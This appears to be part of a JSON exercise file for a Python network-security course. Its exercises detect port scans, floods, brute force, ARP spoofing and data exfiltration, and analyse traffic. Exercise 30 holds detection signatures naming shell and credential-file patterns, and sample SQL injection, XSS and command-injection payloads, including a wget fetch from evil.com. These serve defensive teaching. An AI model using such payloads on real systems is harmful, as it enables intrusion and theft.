+              "message": "def extract_cookies(hdrs):\n    cookies = {}\n    for line in hdrs.split('\\r\\n'):\n        if line.lower().startswith('cookie:'):\n            val = line.split(':',1)[1].strip()\n            for pair in val.split('; '):\n                if '=' in pair: k,v=pair.split('=',1); cookies[k]=v\n    return cookies"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Count Connections Per IP",
+          "description": "Count how many connections each source IP made.",
+          "difficulty": "beginner",
+          "category": "Attack Detection",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on count connections per ip! This is a beginner exercise in Attack Detection.",
+          "starter_code": "from collections import Counter\ndef count_connections(conns):\n    # TODO: Count by source IP\n    pass\n\nconns = [('10.0.0.1','192.168.1.5',80)]*50 + [('10.0.0.2','192.168.1.5',22)]*200 + [('10.0.0.3','192.168.1.5',443)]*10\ncount_connections(conns)",
+          "expected_output": "Connection counts:\n  10.0.0.2: 200\n  10.0.0.1: 50\n  10.0.0.3: 10",
+          "hints": [
+            {
+              "message": "Use Counter on the first element of each tuple."
+            },
+            {
+              "message": "Sort by count descending."
+            },
+            {
+              "message": "from collections import Counter\ndef count_connections(conns):\n    c = Counter(src for src,_,_ in conns)\n    print('Connection counts:')\n    for ip,n in c.most_common(): print(f'  {ip}: {n}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Detect Port Scan",
+          "description": "Flag IPs that contacted more than N unique ports on a target.",
+          "difficulty": "intermediate",
+          "category": "Attack Detection",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on detect port scan! This is a intermediate exercise in Attack Detection.",
+          "starter_code": "from collections import defaultdict\ndef detect_scan(conns, threshold=10):\n    # TODO: Group dest ports by (src, dst) pair\n    pass\n\nconns = [('10.0.0.50','192.168.1.10',p) for p in range(1,101)]\nconns += [('10.0.0.5','192.168.1.10',80)]*5\ndetect_scan(conns)",
+          "expected_output": "PORT SCAN: 10.0.0.50 -> 192.168.1.10 (100 ports)\n10.0.0.5 -> 192.168.1.10: OK (1 port)",
+          "hints": [
+            {
+              "message": "Use defaultdict(set) to collect unique ports per (src, dst) pair."
+            },
+            {
+              "message": "If len(ports) >= threshold, flag as scan."
+            },
+            {
+              "message": "from collections import defaultdict\ndef detect_scan(conns, threshold=10):\n    scanners = defaultdict(set)\n    for s,d,p in conns: scanners[(s,d)].add(p)\n    for (s,d),ports in scanners.items():\n        if len(ports)>=threshold: print(f'PORT SCAN: {s} -> {d} ({len(ports)} ports)')\n        else: print(f'{s} -> {d}: OK ({len(ports)} port)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: Detect SYN Flood",
+          "description": "Identify SYN floods by measuring SYN-to-ACK ratio.",
+          "difficulty": "intermediate",
+          "category": "Attack Detection",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on detect syn flood! This is a intermediate exercise in Attack Detection.",
+          "starter_code": "from collections import defaultdict\ndef detect_flood(pkts, thresh=50):\n    # TODO: Count SYN and ACK per source, check ratio\n    pass\n\npkts = [('10.0.0.99',['SYN'])]*500 + [('10.0.0.99',['ACK'])]*5\npkts += [('10.0.0.1',['SYN'])]*10 + [('10.0.0.1',['ACK'])]*10\ndetect_flood(pkts)",
+          "expected_output": "SYN FLOOD: 10.0.0.99 (500 SYN, 5 ACK, ratio=0.01)\n10.0.0.1: Normal (10 SYN, 10 ACK, ratio=1.00)",
+          "hints": [
+            {
+              "message": "Count SYN-only packets and ACK packets per source IP."
+            },
+            {
+              "message": "Ratio = ACK/SYN. Below 0.3 with high SYN count = flood."
+            },
+            {
+              "message": "from collections import defaultdict\ndef detect_flood(pkts, thresh=50):\n    s = defaultdict(lambda:{'syn':0,'ack':0})\n    for ip,flags in pkts:\n        if 'SYN' in flags and 'ACK' not in flags: s[ip]['syn']+=1\n        if 'ACK' in flags: s[ip]['ack']+=1\n    for ip,d in s.items():\n        r = d['ack']/d['syn'] if d['syn'] else 1\n        if d['syn']>=thresh and r<0.3: print(f'SYN FLOOD: {ip} ({d[\"syn\"]} SYN, {d[\"ack\"]} ACK, ratio={r:.2f})')\n        else: print(f'{ip}: Normal ({d[\"syn\"]} SYN, {d[\"ack\"]} ACK, ratio={r:.2f})')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Detect Brute-Force Login",
+          "description": "Flag IPs making excessive connections to authentication ports.",
+          "difficulty": "intermediate",
+          "category": "Attack Detection",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on detect brute-force login! This is a intermediate exercise in Attack Detection.",
+          "starter_code": "from collections import Counter\ndef detect_brute(conns, threshold=20):\n    # TODO: Count per (src, dst, port) and flag high counts\n    pass\n\nconns = [('10.0.0.50','192.168.1.10',22)]*150\nconns += [('10.0.0.1','192.168.1.10',80)]*3\ndetect_brute(conns)",
+          "expected_output": "BRUTE FORCE: 10.0.0.50 -> 192.168.1.10:22 (SSH) = 150 attempts\n10.0.0.1 -> 192.168.1.10:80 (HTTP) = 3 (OK)",
+          "hints": [
+            {
+              "message": "Use Counter on (src, dst, port) tuples."
+            },
+            {
+              "message": "Threshold of 20+ attempts on auth ports (22, 3389, 80) = brute force."
+            },
+            {
+              "message": "from collections import Counter\ndef detect_brute(conns, threshold=20):\n    c = Counter(conns)\n    svcs = {22:'SSH',3389:'RDP',80:'HTTP',443:'HTTPS'}\n    for (s,d,p),n in c.most_common():\n        svc = svcs.get(p, f'port {p}')\n        if n>=threshold: print(f'BRUTE FORCE: {s} -> {d}:{p} ({svc}) = {n} attempts')\n        else: print(f'{s} -> {d}:{p} ({svc}) = {n} (OK)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: Classify Scan Type",
+          "description": "Determine scan type (SYN, Connect, FIN, Xmas, NULL) from flag patterns.",
+          "difficulty": "advanced",
+          "category": "Attack Detection",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on classify scan type! This is a advanced exercise in Attack Detection.",
+          "starter_code": "def classify_scan(flag_sets):\n    # TODO: Analyse flag patterns to determine scan type\n    pass\n\nscans = [\n    [['SYN'],['SYN'],['SYN']],\n    [['SYN','ACK','FIN'],['SYN','ACK','FIN']],\n    [['FIN'],['FIN'],['FIN']],\n    [[],[]],\n    [['FIN','PSH','URG'],['FIN','PSH','URG']],\n]\nfor flags in scans: print(classify_scan(flags))",
+          "expected_output": "SYN Scan (half-open)\nConnect Scan (full handshake)\nFIN Scan (stealth)\nNULL Scan (no flags)\nXmas Scan (FIN+PSH+URG)",
+          "hints": [
+            {
+              "message": "SYN only = SYN scan. SYN+ACK+FIN = Connect. FIN only = FIN scan."
+            },
+            {
+              "message": "No flags = NULL scan. FIN+PSH+URG = Xmas scan."
+            },
+            {
+              "message": "def classify_scan(flag_sets):\n    if not flag_sets: return 'Unknown'\n    sample = flag_sets[0]\n    if sample == ['SYN']: return 'SYN Scan (half-open)'\n    if set(sample) >= {'SYN','ACK'}: return 'Connect Scan (full handshake)'\n    if sample == ['FIN']: return 'FIN Scan (stealth)'\n    if sample == []: return 'NULL Scan (no flags)'\n    if set(sample) == {'FIN','PSH','URG'}: return 'Xmas Scan (FIN+PSH+URG)'\n    return 'Unknown'"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: Rate-Based Alert System",
+          "description": "Alert when any IP exceeds a packet rate threshold.",
+          "difficulty": "intermediate",
+          "category": "Attack Detection",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on rate-based alert system! This is a intermediate exercise in Attack Detection.",
+          "starter_code": "from collections import defaultdict\ndef rate_alert(pkts, max_per_sec=100):\n    # TODO: Count packets per IP per second, alert on threshold\n    pass\n\nimport time; t = time.time()\npkts = [{'src':'10.0.0.1','ts':t+i*0.001} for i in range(500)]\npkts += [{'src':'10.0.0.2','ts':t+i*0.5} for i in range(10)]\nrate_alert(pkts)",
+          "expected_output": "ALERT: 10.0.0.1 at second 0 — 500 pkts/sec (limit: 100)\n10.0.0.2: OK (max 2 pkts/sec)",
+          "hints": [
+            {
+              "message": "Group packets by (source IP, second). Count per group."
+            },
+            {
+              "message": "If any group exceeds threshold, alert."
+            },
+            {
+              "message": "from collections import defaultdict\ndef rate_alert(pkts, max_per_sec=100):\n    rates = defaultdict(lambda: defaultdict(int))\n    for p in pkts: rates[p['src']][int(p['ts'])] += 1\n    for ip, secs in rates.items():\n        peak = max(secs.values())\n        if peak > max_per_sec:\n            s = max(secs, key=secs.get)\n            print(f'ALERT: {ip} at second {s-min(secs.keys())} -- {peak} pkts/sec (limit: {max_per_sec})')\n        else: print(f'{ip}: OK (max {peak} pkts/sec)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Detect ARP Spoofing",
+          "description": "Flag ARP responses where one MAC claims multiple IPs.",
+          "difficulty": "advanced",
+          "category": "Attack Detection",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on detect arp spoofing! This is a advanced exercise in Attack Detection.",
+          "starter_code": "from collections import defaultdict\ndef detect_arp_spoof(arp_responses):\n    # TODO: Group IPs by MAC. Multiple IPs = possible spoof\n    pass\n\narps = [\n    ('AA:BB:CC:DD:EE:FF', '192.168.1.1'),\n    ('AA:BB:CC:DD:EE:FF', '192.168.1.100'),\n    ('AA:BB:CC:DD:EE:FF', '192.168.1.200'),\n    ('11:22:33:44:55:66', '192.168.1.50'),\n]\ndetect_arp_spoof(arps)",
+          "expected_output": "ARP SPOOF: AA:BB:CC:DD:EE:FF claims 3 IPs: 192.168.1.1, 192.168.1.100, 192.168.1.200\n11:22:33:44:55:66: OK (1 IP)",
+          "hints": [
+            {
+              "message": "Group IPs by MAC address. If one MAC has multiple IPs, it is suspicious."
+            },
+            {
+              "message": "Legitimate scenarios: router with multiple IPs. But 3+ is very suspicious."
+            },
+            {
+              "message": "from collections import defaultdict\ndef detect_arp_spoof(arps):\n    mac_ips = defaultdict(set)\n    for mac, ip in arps: mac_ips[mac].add(ip)\n    for mac, ips in mac_ips.items():\n        if len(ips)>1: print(f'ARP SPOOF: {mac} claims {len(ips)} IPs: {\", \".join(sorted(ips))}')\n        else: print(f'{mac}: OK ({len(ips)} IP)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: ICMP Flood Detector",
+          "description": "Detect ICMP flood (ping flood) attacks.",
+          "difficulty": "intermediate",
+          "category": "Attack Detection",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on icmp flood detector! This is a intermediate exercise in Attack Detection.",
+          "starter_code": "from collections import Counter\ndef detect_ping_flood(pkts, threshold=50):\n    # TODO: Count ICMP Echo Requests per source\n    pass\n\npkts = [('10.0.0.99','192.168.1.1','echo_request')]*300\npkts += [('10.0.0.1','192.168.1.1','echo_request')]*5\ndetect_ping_flood(pkts)",
+          "expected_output": "PING FLOOD: 10.0.0.99 -> 300 ICMP requests\n10.0.0.1: OK (5 requests)",
+          "hints": [
+            {
+              "message": "Count ICMP echo requests per source IP."
+            },
+            {
+              "message": "300 pings from one IP in a short window = flood."
+            },
+            {
+              "message": "from collections import Counter\ndef detect_ping_flood(pkts, threshold=50):\n    c = Counter(s for s,d,t in pkts if t=='echo_request')\n    for ip,n in c.most_common():\n        if n>=threshold: print(f'PING FLOOD: {ip} -> {n} ICMP requests')\n        else: print(f'{ip}: OK ({n} requests)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: Connection Duration Monitor",
+          "description": "Flag connections that last unusually long (potential C2 channels).",
+          "difficulty": "intermediate",
+          "category": "Attack Detection",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on connection duration monitor! This is a intermediate exercise in Attack Detection.",
+          "starter_code": "def check_duration(flows, max_minutes=30):\n    # TODO: Calculate duration per flow, flag long ones\n    pass\n\nflows = [\n    {'src':'10.0.0.1','dst':'93.184.216.34','port':443,'start':0,'end':120},\n    {'src':'10.0.0.5','dst':'evil.com','port':8443,'start':0,'end':7200},\n    {'src':'10.0.0.3','dst':'cdn.com','port':80,'start':0,'end':5},\n]\ncheck_duration(flows)",
+          "expected_output": "10.0.0.1->93.184.216.34:443 — 2.0 min (OK)\n10.0.0.5->evil.com:8443 — 120.0 min (ALERT: Long connection!)\n10.0.0.3->cdn.com:80 — 0.1 min (OK)",
+          "hints": [
+            {
+              "message": "Duration = end - start (in seconds). Convert to minutes."
+            },
+            {
+              "message": "Flag connections exceeding threshold."
+            },
+            {
+              "message": "def check_duration(flows, max_minutes=30):\n    for f in flows:\n        dur = (f['end']-f['start'])/60\n        alert = ' (ALERT: Long connection!)' if dur > max_minutes else ' (OK)'\n        print(f'{f[\"src\"]}->{f[\"dst\"]}:{f[\"port\"]} -- {dur:.1f} min{alert}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Build Simple IDS Signature",
+          "description": "Implement a pattern-matching IDS that checks payloads against signatures.",
+          "difficulty": "advanced",
+          "category": "Attack Detection",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on build simple ids signature! This is a advanced exercise in Attack Detection.",
+          "starter_code": "def ids_check(packets, signatures):\n    # TODO: Check each packet payload against signature patterns\n    pass\n\nsigs = [\n    ('SQL Injection', [b'UNION SELECT', b\"' OR '1'='1\", b'DROP TABLE']),\n    ('XSS Attempt', [b'<script>', b'javascript:', b'onerror=']),\n    ('Shell Command', [b'/bin/sh', b'/etc/passwd', b'wget ', b'curl ']),\n]\npkts = [\n    b\"GET /page?id=1' UNION SELECT * FROM users HTTP/1.1\",\n    b'POST /form HTTP/1.1\\r\\n\\r\\nname=<script>alert(1)</script>',\n    b'GET /index.html HTTP/1.1',\n    b'GET /cmd?exec=/bin/sh -c wget http://evil.com/mal HTTP/1.1',\n]\nids_check(pkts, sigs)",
+          "expected_output": "ALERT [SQL Injection]: UNION SELECT\nALERT [XSS Attempt]: <script>\nPacket 3: CLEAN\nALERT [Shell Command]: /bin/sh, wget",
+          "hints": [
+            {
+              "message": "For each packet, check if any signature pattern appears in the payload."
+            },
+            {
+              "message": "Use pattern.lower() in payload.lower() for case-insensitive matching."
+            },
+            {
+              "message": "def ids_check(pkts, sigs):\n    for i,pkt in enumerate(pkts):\n        found = []\n        for name, patterns in sigs:\n            matches = [p.decode() for p in patterns if p.lower() in pkt.lower()]\n            if matches: found.append(f'[{name}]: {\", \".join(matches)}')\n        if found:\n            for f in found: print(f'ALERT {f}')\n        else: print(f'Packet {i+1}: CLEAN')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Count Packets by Protocol",
+          "description": "Count TCP, UDP, and ICMP packets in a traffic sample.",
+          "difficulty": "beginner",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on count packets by protocol! This is a beginner exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import Counter\ndef count_protocols(pkts):\n    # TODO: Count by protocol field\n    pass\n\npkts = [{'proto':'TCP'}]*100 + [{'proto':'UDP'}]*30 + [{'proto':'ICMP'}]*5\ncount_protocols(pkts)",
+          "expected_output": "TCP:  100 (74.1%)\nUDP:   30 (22.2%)\nICMP:   5 (3.7%)",
+          "hints": [
+            {
+              "message": "Use Counter on p['proto'] for each packet."
+            },
+            {
+              "message": "Calculate percentage: count/total*100."
+            },
+            {
+              "message": "from collections import Counter\ndef count_protocols(pkts):\n    c = Counter(p['proto'] for p in pkts)\n    for proto,n in c.most_common():\n        print(f'{proto:5s}: {n:4d} ({n/len(pkts)*100:.1f}%)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Calculate Bandwidth Usage",
+          "description": "Sum bytes per source IP to find top bandwidth consumers.",
+          "difficulty": "beginner",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on calculate bandwidth usage! This is a beginner exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import defaultdict\ndef bandwidth(pkts):\n    # TODO: Sum bytes per source IP\n    pass\n\npkts = [{'src':'10.0.0.1','size':1200}]*100 + [{'src':'10.0.0.2','size':64}]*500 + [{'src':'10.0.0.3','size':9000}]*10\nbandwidth(pkts)",
+          "expected_output": "Bandwidth (top sources):\n  10.0.0.1: 120,000 bytes (117.2 KB)\n  10.0.0.3:  90,000 bytes (87.9 KB)\n  10.0.0.2:  32,000 bytes (31.2 KB)",
+          "hints": [
+            {
+              "message": "Use defaultdict(int) to sum sizes per source."
+            },
+            {
+              "message": "Sort by total bytes descending."
+            },
+            {
+              "message": "from collections import defaultdict\ndef bandwidth(pkts):\n    bw = defaultdict(int)\n    for p in pkts: bw[p['src']] += p['size']\n    print('Bandwidth (top sources):')\n    for ip,b in sorted(bw.items(), key=lambda x:-x[1]):\n        print(f'  {ip}: {b:,} bytes ({b/1024:.1f} KB)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Group Packets into Flows",
+          "description": "Group packets by 5-tuple into network flows.",
+          "difficulty": "intermediate",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on group packets into flows! This is a intermediate exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import defaultdict\ndef group_flows(pkts):\n    # TODO: Group by (src, dst, sport, dport, proto)\n    pass\n\npkts = [{'src':'10.0.0.1','dst':'93.184.216.34','sp':52431,'dp':443,'proto':'TCP','size':1200}]*50\npkts += [{'src':'10.0.0.1','dst':'8.8.8.8','sp':54321,'dp':53,'proto':'UDP','size':64}]*10\ngroup_flows(pkts)",
+          "expected_output": "2 flows:\n  10.0.0.1:52431 -> 93.184.216.34:443 (TCP) 50 pkts 60,000B\n  10.0.0.1:54321 -> 8.8.8.8:53 (UDP) 10 pkts 640B",
+          "hints": [
+            {
+              "message": "Key = (src, dst, sport, dport, proto). Count packets and sum bytes."
+            },
+            {
+              "message": "defaultdict with lambda for nested counters."
+            },
+            {
+              "message": "from collections import defaultdict\ndef group_flows(pkts):\n    flows = defaultdict(lambda:{'n':0,'bytes':0})\n    for p in pkts:\n        k = (p['src'],p['dst'],p['sp'],p['dp'],p['proto'])\n        flows[k]['n']+=1; flows[k]['bytes']+=p['size']\n    print(f'{len(flows)} flows:')\n    for (s,d,sp,dp,pr),i in sorted(flows.items(),key=lambda x:-x[1]['bytes']):\n        print(f'  {s}:{sp} -> {d}:{dp} ({pr}) {i[\"n\"]} pkts {i[\"bytes\"]:,}B')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Top Talkers Report",
+          "description": "Find the top 5 most active source IPs by packet count.",
+          "difficulty": "beginner",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on top talkers report! This is a beginner exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import Counter\ndef top_talkers(pkts, n=5):\n    # TODO: Count by source, show top N\n    pass\n\npkts = [{'src':f'10.0.0.{i%10}'} for i in range(1000)]\ntop_talkers(pkts)",
+          "expected_output": "Top 5 Talkers:\n  10.0.0.0: 100 packets\n  10.0.0.1: 100 packets\n  10.0.0.2: 100 packets\n  10.0.0.3: 100 packets\n  10.0.0.4: 100 packets",
+          "hints": [
+            {
+              "message": "Counter(p['src'] for p in pkts).most_common(n)"
+            },
+            {
+              "message": "Print top N with packet counts."
+            },
+            {
+              "message": "from collections import Counter\ndef top_talkers(pkts, n=5):\n    c = Counter(p['src'] for p in pkts)\n    print(f'Top {n} Talkers:')\n    for ip,cnt in c.most_common(n): print(f'  {ip}: {cnt} packets')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Port Distribution Analysis",
+          "description": "Analyse which destination ports receive the most traffic.",
+          "difficulty": "intermediate",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on port distribution analysis! This is a intermediate exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import Counter\ndef port_distribution(pkts):\n    # TODO: Count by destination port, show percentages\n    pass\n\npkts = [{'dp':443}]*200 + [{'dp':80}]*80 + [{'dp':22}]*50 + [{'dp':53}]*30 + [{'dp':3306}]*10\nport_distribution(pkts)",
+          "expected_output": "Port Distribution:\n  443 (HTTPS): 200 (54.1%)\n   80 (HTTP):   80 (21.6%)\n   22 (SSH):    50 (13.5%)\n   53 (DNS):    30 (8.1%)\n 3306 (MySQL):  10 (2.7%)",
+          "hints": [
+            {
+              "message": "Counter on p['dp']. Map ports to service names."
+            },
+            {
+              "message": "Calculate percentage of total."
+            },
+            {
+              "message": "from collections import Counter\ndef port_distribution(pkts):\n    c = Counter(p['dp'] for p in pkts)\n    svcs = {80:'HTTP',443:'HTTPS',22:'SSH',53:'DNS',3306:'MySQL',3389:'RDP',25:'SMTP'}\n    total = len(pkts)\n    print('Port Distribution:')\n    for port,n in c.most_common():\n        svc = svcs.get(port,f'port {port}')\n        print(f'  {port:5d} ({svc}): {n:4d} ({n/total*100:.1f}%)')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: Packet Size Histogram",
+          "description": "Create a text-based histogram of packet sizes.",
+          "difficulty": "intermediate",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on packet size histogram! This is a intermediate exercise in Traffic Statistics & Flows.",
+          "starter_code": "def size_histogram(pkts):\n    # TODO: Bucket sizes and display histogram\n    pass\n\nimport random; random.seed(42)\npkts = [{'size': random.choice([64]*30 + [576]*20 + [1500]*40 + [9000]*10)} for _ in range(200)]\nsize_histogram(pkts)",
+          "expected_output": "Packet Size Distribution:\n  0-127:     60 ████████████████\n  128-575:    0 \n  576-1023:  40 ██████████\n  1024-1499:  0 \n  1500+:    100 █████████████████████████",
+          "hints": [
+            {
+              "message": "Define size buckets (0-127, 128-575, 576-1023, 1024-1499, 1500+)."
+            },
+            {
+              "message": "Count packets in each bucket. Use block characters for bars."
+            },
+            {
+              "message": "def size_histogram(pkts):\n    buckets = [(0,127),(128,575),(576,1023),(1024,1499),(1500,99999)]\n    labels = ['0-127','128-575','576-1023','1024-1499','1500+']\n    counts = [0]*5\n    for p in pkts:\n        for i,(lo,hi) in enumerate(buckets):\n            if lo <= p['size'] <= hi: counts[i]+=1; break\n    print('Packet Size Distribution:')\n    for l,c in zip(labels,counts):\n        bar = chr(9608) * (c//4)\n        print(f'  {l:12s}: {c:3d} {bar}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: Unique Conversations",
+          "description": "List all unique IP-to-IP conversations with packet counts.",
+          "difficulty": "intermediate",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on unique conversations! This is a intermediate exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import Counter\ndef conversations(pkts):\n    # TODO: Count unique (src,dst) pairs\n    pass\n\npkts = [{'src':'10.0.0.1','dst':'93.184.216.34'}]*50\npkts += [{'src':'93.184.216.34','dst':'10.0.0.1'}]*45\npkts += [{'src':'10.0.0.1','dst':'8.8.8.8'}]*10\nconversations(pkts)",
+          "expected_output": "Conversations:\n  10.0.0.1 <-> 93.184.216.34: 95 packets\n  10.0.0.1 <-> 8.8.8.8: 10 packets",
+          "hints": [
+            {
+              "message": "Normalise direction: sorted tuple of (src, dst) so A->B and B->A are same."
+            },
+            {
+              "message": "Count normalised pairs."
+            },
+            {
+              "message": "from collections import Counter\ndef conversations(pkts):\n    c = Counter(tuple(sorted([p['src'],p['dst']])) for p in pkts)\n    print('Conversations:')\n    for (a,b),n in c.most_common(): print(f'  {a} <-> {b}: {n} packets')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Time-Based Traffic Graph",
+          "description": "Show packets-per-second as a text graph.",
+          "difficulty": "intermediate",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on time-based traffic graph! This is a intermediate exercise in Traffic Statistics & Flows.",
+          "starter_code": "def traffic_graph(pkts, bucket_sec=1):\n    # TODO: Count packets per time bucket, draw text graph\n    pass\n\nimport time; t=time.time()\npkts = [{'ts':t+i*0.01} for i in range(100)] + [{'ts':t+5+i*0.001} for i in range(500)] + [{'ts':t+10+i*0.1} for i in range(50)]\ntraffic_graph(pkts)",
+          "expected_output": "Traffic (pkts/sec):\n  0s:  100 ██████████\n  5s:  500 ██████████████████████████████████████████████████\n 10s:   50 █████",
+          "hints": [
+            {
+              "message": "Bucket by int(ts - min_ts). Count per bucket."
+            },
+            {
+              "message": "Draw bars proportional to count."
+            },
+            {
+              "message": "def traffic_graph(pkts, bucket_sec=1):\n    from collections import Counter\n    if not pkts: return\n    t0 = min(p['ts'] for p in pkts)\n    c = Counter(int(p['ts']-t0) for p in pkts)\n    print('Traffic (pkts/sec):')\n    mx = max(c.values())\n    for sec in sorted(c.keys()):\n        bar = chr(9608) * max(1, c[sec]*50//mx)\n        print(f'  {sec:2d}s: {c[sec]:4d} {bar}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: External vs Internal Traffic",
+          "description": "Classify traffic as internal (RFC1918) or external.",
+          "difficulty": "intermediate",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on external vs internal traffic! This is a intermediate exercise in Traffic Statistics & Flows.",
+          "starter_code": "def classify_traffic(pkts):\n    # TODO: Check if IPs are in 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\n    pass\n\npkts = [\n    {'src':'10.0.0.1','dst':'93.184.216.34'},\n    {'src':'192.168.1.5','dst':'192.168.1.10'},\n    {'src':'172.16.0.5','dst':'8.8.8.8'},\n]\nclassify_traffic(pkts)",
+          "expected_output": "10.0.0.1 -> 93.184.216.34: OUTBOUND\n192.168.1.5 -> 192.168.1.10: INTERNAL\n172.16.0.5 -> 8.8.8.8: OUTBOUND",
+          "hints": [
+            {
+              "message": "RFC1918 ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x."
+            },
+            {
+              "message": "If both internal=INTERNAL, if src internal + dst external=OUTBOUND, etc."
+            },
+            {
+              "message": "def classify_traffic(pkts):\n    def is_priv(ip):\n        p = ip.split('.')\n        if p[0]=='10': return True\n        if p[0]=='172' and 16<=int(p[1])<=31: return True\n        if p[0]=='192' and p[1]=='168': return True\n        return False\n    for p in pkts:\n        si, di = is_priv(p['src']), is_priv(p['dst'])\n        if si and di: t='INTERNAL'\n        elif si and not di: t='OUTBOUND'\n        elif not si and di: t='INBOUND'\n        else: t='EXTERNAL'\n        print(f'{p[\"src\"]} -> {p[\"dst\"]}: {t}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Data Exfiltration Detector",
+          "description": "Flag unusually large outbound data transfers.",
+          "difficulty": "advanced",
+          "category": "Traffic Statistics & Flows",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on data exfiltration detector! This is a advanced exercise in Traffic Statistics & Flows.",
+          "starter_code": "from collections import defaultdict\ndef detect_exfil(pkts, threshold_mb=10):\n    # TODO: Sum outbound bytes per destination, flag large transfers\n    pass\n\npkts = [{'src':'10.0.0.5','dst':'evil.com','size':50000}]*300\npkts += [{'src':'10.0.0.1','dst':'google.com','size':1200}]*100\ndetect_exfil(pkts)",
+          "expected_output": "DATA EXFILTRATION ALERT: 10.0.0.5 -> evil.com = 15,000,000 bytes (14.3 MB)\n10.0.0.1 -> google.com = 120,000 bytes (0.1 MB) OK",
+          "hints": [
+            {
+              "message": "Sum bytes per (src, dst) pair. Flag if total exceeds threshold."
+            },
+            {
+              "message": "Convert to MB: bytes / 1024 / 1024."
+            },
+            {
+              "message": "from collections import defaultdict\ndef detect_exfil(pkts, threshold_mb=10):\n    transfers = defaultdict(int)\n    for p in pkts: transfers[(p['src'],p['dst'])] += p['size']\n    for (s,d),b in sorted(transfers.items(), key=lambda x:-x[1]):\n        mb = b/1024/1024\n        if mb >= threshold_mb:\n            print(f'DATA EXFILTRATION ALERT: {s} -> {d} = {b:,} bytes ({mb:.1f} MB)')\n        else: print(f'{s} -> {d} = {b:,} bytes ({mb:.1f} MB) OK')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Parse ICMP Type and Code",
+          "description": "Decode ICMP type and code into human-readable descriptions.",
+          "difficulty": "beginner",
+          "category": "ICMP & Advanced Protocols",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on parse icmp type and code! This is a beginner exercise in ICMP & Advanced Protocols.",
+          "starter_code": "import struct\ndef parse_icmp(data):\n    # TODO: Unpack type and code, map to descriptions\n    pass\n\nfor t,c in [(8,0),(0,0),(3,0),(3,1),(3,3),(3,13),(11,0),(5,1)]:\n    parse_icmp(struct.pack('!BBH',t,c,0))",
+          "expected_output": "Type 8 Code 0: Echo Request\nType 0 Code 0: Echo Reply\nType 3 Code 0: Network Unreachable\nType 3 Code 1: Host Unreachable\nType 3 Code 3: Port Unreachable\nType 3 Code 13: Filtered\nType 11 Code 0: TTL Exceeded\nType 5 Code 1: Redirect for Host",
+          "hints": [
+            {
+              "message": "Build dictionaries for types and subtypes (codes within type 3 and 5)."
+            },
+            {
+              "message": "Type 3 codes: 0=net, 1=host, 3=port, 13=filtered. Type 5: redirect."
+            },
+            {
